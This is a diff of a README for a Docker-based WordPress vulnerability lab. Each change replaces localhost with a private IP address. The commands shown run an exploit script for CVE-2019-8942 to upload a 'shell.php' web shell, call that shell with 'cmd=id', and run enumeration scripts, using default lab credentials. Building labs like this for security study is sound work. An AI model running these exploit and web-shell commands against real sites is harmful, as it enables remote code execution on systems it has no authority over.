@@ -69,7 +69,7 @@ docker compose logs -f setup     # look for "setup] done"
 ./scripts/check.sh
 ```
 
-Browse to [http://localhost:18180/wp-admin](http://localhost:18180/wp-admin) and log in as `author` / `AuthorPass123!`.
+Browse to [http://192.168.4.36:18180/wp-admin](http://192.168.4.36:18180/wp-admin) and log in as `author` / `AuthorPass123!`.
 
 > If accessing from another machine, set `WP_URL=http://<host-ip>:18180` in `.env` before first boot or `docker compose down -v && docker compose up -d` after changing.
 
@@ -77,9 +77,9 @@ Browse to [http://localhost:18180/wp-admin](http://localhost:18180/wp-admin) and
 ```bash
 cd ~/wp-cve-all/exploits/cve-2019-8942
 # Use provided polyglot
-./scripts/manual_exploit.sh http://localhost:18180 author AuthorPass123! shell.php
+./scripts/manual_exploit.sh http://192.168.4.36:18180 author AuthorPass123! shell.php
 # Access shell
-curl "http://localhost:18180/wp-content/themes/twentynineteen/shell.php?cmd=id"
+curl "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php?cmd=id"
 ```
 
 #### Manual Steps (Detailed)
@@ -295,9 +295,9 @@ Similar to 21662, requires gadget chains. Can be exploited via term queries if u
 ### Enumeration
 ```bash
 cd ~/wp-cve-all
-./enumerate.sh http://localhost:18180
+./enumerate.sh http://192.168.4.36:18180
 # or
-./scripts/enumerate.sh http://localhost:18180
+./scripts/enumerate.sh http://192.168.4.36:18180
 ```
 
 ### Check version
